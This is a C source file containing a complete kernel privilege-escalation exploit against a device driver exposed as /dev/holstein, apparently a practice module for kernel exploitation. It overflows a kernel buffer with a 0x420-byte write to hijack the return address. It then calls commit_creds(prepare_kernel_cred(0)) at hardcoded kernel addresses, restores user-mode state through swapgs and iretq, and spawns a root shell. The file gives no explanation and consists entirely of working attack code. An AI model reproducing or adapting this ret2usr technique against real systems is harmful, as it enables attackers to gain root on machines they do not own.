#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdint.h>


int global_fd;


unsigned long user_cs, user_ss, user_rflags, user_rsp;

uint64_t prepare_kernel_cred = 0xffffffff8106e240;
uint64_t commit_creds = 0xffffffff8106e390;

void open_dev() {

	global_fd = open("/dev/holstein", O_RDWR);
	if (global_fd < 0) {
		puts("[!] Failed to open FD.\n");
		exit(-1);
	} else {
		puts("[*] Opened device! :)\n");
	}
}


static void save_state() {
  asm(
      "movq %%cs, %0\n"
      "movq %%ss, %1\n"
      "movq %%rsp, %2\n"
      "pushfq\n"
      "popq %3\n"
      : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
      :
      : "memory");
}

static void win() {
  char *argv[] = { "/bin/sh", NULL };
  char *envp[] = { NULL };
  puts("[+] win!");
  execve("/bin/sh", argv, envp);
}


static void restore_state() {
  asm volatile("swapgs ;"
               "movq %0, 0x20(%%rsp)\t\n"
               "movq %1, 0x18(%%rsp)\t\n"
               "movq %2, 0x10(%%rsp)\t\n"
               "movq %3, 0x08(%%rsp)\t\n"
               "movq %4, 0x00(%%rsp)\t\n"
               "iretq"
               :
               : "r"(user_ss),
                 "r"(user_rsp),
                 "r"(user_rflags),
                 "r"(user_cs), "r"(win));
}

static void escalate_privilege() {
  char* (*pkc)(int) = (void*)(prepare_kernel_cred);
  void (*cc)(char*) = (void*)(commit_creds);
  (*cc)((*pkc)(0));
  restore_state();
}

// vuln 16384 0 - Live 0xffffffffc0000000 (O)
// +190

// ffffffff8106e240 T prepare_kernel_cred
// ffffffff8106e390 T commit_creds


void overwrite() {


	char payload[0x420];
	memset(payload, 'A', 0x408);

	*(unsigned long*)&payload[0x408] = (unsigned long)&escalate_privilege;
	
	ssize_t w = write(global_fd, payload, 0x420);
	puts("[*] Se debería haber escrito esto por ahí! :s");
}

int main() {

	save_state();
	open_dev();
	overwrite();
	puts("[!] Should never be reached!");

	return 0;

}
